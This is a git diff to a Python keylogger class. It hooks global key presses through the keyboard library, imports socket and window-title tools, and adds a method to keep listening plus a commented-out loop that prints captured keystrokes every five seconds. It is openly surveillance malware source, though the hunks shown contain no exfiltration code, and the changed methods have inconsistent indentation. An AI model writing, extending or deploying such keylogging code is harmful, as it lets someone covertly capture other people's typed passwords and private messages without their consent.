@@ -1,3 +1,5 @@
+import time
+
 import keyboard, socket, re, unicodedata
 from datetime import datetime
 import pygetwindow as gw
@@ -36,14 +38,19 @@ class KeyLogger:
         self.running = False
 
     def start(self):
-        keyboard.on_press(self.log_event)
-        # keyboard.wait()
+            keyboard.on_press(self.log_event)
 
+    def continue_listen(self):
+            self.running = True
+
+#
 # if __name__ == "__main__":
 #     keylogger = KeyLogger("keylogger")
 #
 #     try:
 #         keylogger.start()
+#         while True:
+#             time.sleep(5)
+#             print(keylogger.get_and_clear_buffer())
 #     except KeyboardInterrupt:
 #         keylogger.stop()
-#         print(keylogger.get_and_clear_buffer())
